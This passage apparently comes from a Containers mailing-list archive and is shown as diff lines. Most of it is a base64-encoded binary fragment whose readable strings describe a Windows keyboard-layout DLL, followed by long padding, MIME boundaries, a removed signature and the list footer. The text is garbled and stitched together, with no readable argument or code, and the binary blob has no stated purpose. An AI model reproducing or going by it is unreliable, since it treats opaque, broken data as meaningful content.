+TQBpAGMAcgBvAHMAbwBmAHQAIABDAG8AcgBwAG8AcgBhAHQAaQBvAG4ALgAgAEEAbABsACAA
+cgBpAGcAaAB0AHMAIAByAGUAcwBlAHIAdgBlAGQALgAAAD4ACwABAE8AcgBpAGcAaQBuAGEA
+bABGAGkAbABlAG4AYQBtAGUAAABrAGIAZAAxADAAMQAuAGQAbABsAAAAAABqACUAAQBQAHIA
+bwBkAHUAYwB0AE4AYQBtAGUAAAAAAE0AaQBjAHIAbwBzAG8AZgB0AK4AIABXAGkAbgBkAG8A
+dwBzAK4AIABPAHAAZQByAGEAdABpAG4AZwAgAFMAeQBzAHQAZQBtAAAAAABCAA8AAQBQAHIA
+bwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAA2AC4AMQAuADcANgAwADAALgAxADYAMwA4ADUA
+AAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwA
+YQB0AGkAbwBuAAAAAAAAALAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAACgAAAACKEgoSih
+OKFAoVChYKFooailIKYwpkCmUKYoqjiqSKpYqmiqeKqIqpiqqKq4qsiq2KroqviqCKsYqyir
+OKtIq1iraK14rYitmK2orbityK3Yreit+K0IrhiuKK44rkiuWK5orniuiK6YrqiuuK7Irtiu
+6K74rgivGK8orzivSK9Yr2iveK+Ir5ivqK+4r8iv2K/or/ivAAAAIAAAHAAAAAigGKAooDig
+SKBYoGigeKCIoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAA
+------------6B3403ABE032443
 
 
 
--- 
-Andy Lutomirski
-AMA Capital Management, LLC
+------------6B3403ABE032443--
+
+--E7472422E14.1409203329/mail104.syd.optusnet.com.au--
+
+--===============1212222873534643064==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+Containers mailing list
+Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+https://lists.linuxfoundation.org/mailman/listinfo/containers
+--===============1212222873534643064==--
